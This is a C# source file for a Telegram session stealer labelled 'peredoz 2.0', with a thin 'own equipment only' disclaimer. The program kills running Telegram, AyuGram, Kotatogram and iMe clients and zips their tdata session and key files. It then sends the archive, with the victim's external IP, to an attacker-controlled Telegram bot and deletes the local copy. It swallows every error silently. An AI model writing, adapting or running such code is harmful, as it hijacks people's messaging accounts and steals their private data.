/*
peredoz version : 2.0
attention: ИСКЛЮЧИТЕЛЬНО ДЛЯ ТЕСТИРОВАНИЯ НА СОБСТВЕННОМ ОБОРУДОВАНИИ
https://t.me/kryyaasoft
*/
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

class Program
{
    private const string BotToken = "";
    private const string AdminId = "";

    static async Task Main() => await new Program().Run();

    async Task Run()
    {
        try
        {
            var ip = await GetExternalIP();
            await ProcessTelegramClients(ip);
        }
        catch { }
    }

    async Task<string> GetExternalIP()
    {
        try
        {
            using var http = new HttpClient();
            http.Timeout = TimeSpan.FromSeconds(6);
            return (await http.GetStringAsync("https://wtfismyip.com/text")).Trim();
        }
        catch { return "IP Unknown"; }
    }

    async Task ProcessTelegramClients(string userIp)
    {
        var targets = new[] { "Telegram", "AyuGram", "Kotatogram", "iMe" };
        var tasks = targets
            .Select(target => ProcessClient(target, userIp))
            .ToArray();

        await Task.WhenAll(tasks);
    }

    async Task ProcessClient(string clientName, string userIp)
    {
        try
        {
            var proc = Process.GetProcessesByName(clientName).FirstOrDefault();
            if (proc?.MainModule?.FileName == null) return;

            string clientPath = Path.GetDirectoryName(proc.MainModule.FileName) ?? string.Empty;
            if (string.IsNullOrEmpty(clientPath)) return;

            try
            {
                proc.Kill();
                proc.WaitForExit(500);
            }
            catch { }

            await Task.Delay(300);
            await CollectAndSendData(clientPath, clientName, userIp);
        }
        catch { }
    }

    async Task CollectAndSendData(string clientPath, string clientName, string userIp)
    {
        string tdataPath = Path.Combine(clientPath, "tdata");
        if (!Directory.Exists(tdataPath)) return;

        var files = new List<string>();
        Directory.SetCurrentDirectory(tdataPath);

        AddSpecialFiles(files);
        ScanDirsForFiles(files);

        if (files.Count == 0) return;

        string zipPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".zip");
        CreateZipArchive(files, zipPath);

        await SendViaTelegram(zipPath, clientName, userIp);
        Cleanup(zipPath);
    }

    static void AddSpecialFiles(List<string> files)
    {
        string[] specialFiles = { "key_datas", "settingss", "usertag" };
        foreach (var file in specialFiles)
        {
            if (File.Exists(file)) files.Add(file);
        }
    }

    static void ScanDirsForFiles(List<string> files)
    {
        foreach (var dir in Directory.GetDirectories(Directory.GetCurrentDirectory()))
        {
            string dirName = Path.GetFileName(dir);
            string fileMarker = Path.Combine(Directory.GetCurrentDirectory(), dirName + "s");

            if (File.Exists(fileMarker))
            {
                files.Add(fileMarker);
                files.Add(dir);

                string[] subFiles = { "maps", "configs" };
                foreach (var subFile in subFiles)
                {
                    string path = Path.Combine(dir, subFile);
                    if (File.Exists(path)) files.Add(path);
                }
            }
        }
    }

    static void CreateZipArchive(List<string> files, string zipPath)
    {
        using var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create);
        foreach (var path in files)
        {
            try
            {
                if (File.Exists(path))
                {
                    archive.CreateEntryFromFile(path, Path.GetFileName(path));
                }
                else if (Directory.Exists(path))
                {
                    foreach (var file in Directory.GetFiles(path, "*", SearchOption.AllDirectories))
                    {
                        var relativePath = Path.GetRelativePath(path, file);
                        archive.CreateEntryFromFile(file, Path.Combine(Path.GetFileName(path), relativePath));
                    }
                }
            }
            catch { }
        }
    }

    async Task SendViaTelegram(string zipPath, string clientName, string userIp)
    {
        try
        {
            using var http = new HttpClient();
            using var form = new MultipartFormDataContent();
            
            form.Add(new StringContent(AdminId), "chat_id");
            form.Add(new StringContent($"*Client*: `{clientName}`\n*IP*: `{userIp}`"), "caption");
            form.Add(new StringContent("Markdown"), "parse_mode");

            using var fileStream = File.OpenRead(zipPath);
            form.Add(new StreamContent(fileStream), "document", "session_data.zip");

            await http.PostAsync($"https://api.telegram.org/bot{BotToken}/sendDocument", form);
        }
        catch { }
    }

    static void Cleanup(string zipPath)
    {
        try
        {
            if (File.Exists(zipPath))
                File.Delete(zipPath);
        }
        catch { }
    }
}